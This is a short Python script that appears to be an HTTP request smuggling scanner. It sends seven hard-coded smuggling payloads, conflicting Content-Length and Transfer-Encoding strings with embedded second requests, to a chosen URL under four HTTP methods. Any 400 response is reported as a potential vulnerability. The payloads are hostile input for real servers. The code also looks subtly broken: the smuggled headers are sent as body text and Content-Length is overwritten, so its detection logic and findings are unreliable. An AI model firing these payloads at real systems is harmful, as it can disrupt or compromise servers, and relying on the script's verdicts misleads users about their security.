#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914
import argparse
import requests

# Define a list of HTTP methods to test
http_methods = ['GET', 'POST', 'PUT', 'DELETE']

# Define a list of common request smuggling techniques to test
smuggling_techniques = [
    "Content-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nxxxx\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: X\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n"
]

# Define a function to send requests and check for request smuggling vulnerabilities
def check_vulnerabilities(url):
    for method in http_methods:
        for technique in smuggling_techniques:
            try:
                headers = {'Connection': 'keep-alive', 'Content-Type': 'text/plain', 'Content-Length': '0', 'X': 'X'}
                headers.update({'Content-Length': str(len(technique))})
                req = requests.request(method, url, headers=headers, data=technique, timeout=5, allow_redirects=False)
                if req.status_code == 400:
                    print("Potential request smuggling vulnerability found with method: %s, technique: %s" % (method, technique))
            except requests.exceptions.Timeout:
                print('Request error: Timed out while connecting to %s' % url)
            except requests.exceptions.TooManyRedirects:
                print('Request error: Too many redirects while connecting to %s' % url)
            except requests.exceptions.RequestException as e:
                print('Request error: %s' % e)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Check for request smuggling vulnerabilities.')
    parser.add_argument('-u', '--url', type=str, required=True, help='URL to check for vulnerabilities')
    parser.add_argument('-d', '--debug', action='store_true', help='Print error messages to the screen')

    args = parser.parse_args()

    if args.debug:
        requests.packages.urllib3.disable_warnings()
        requests_log = requests.logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(requests.logging.DEBUG)
        requests_log.propagate = True

    try:
        check_vulnerabilities(args.url)
    except requests.exceptions.RequestException as e:
        print('Request error: %s' % e)
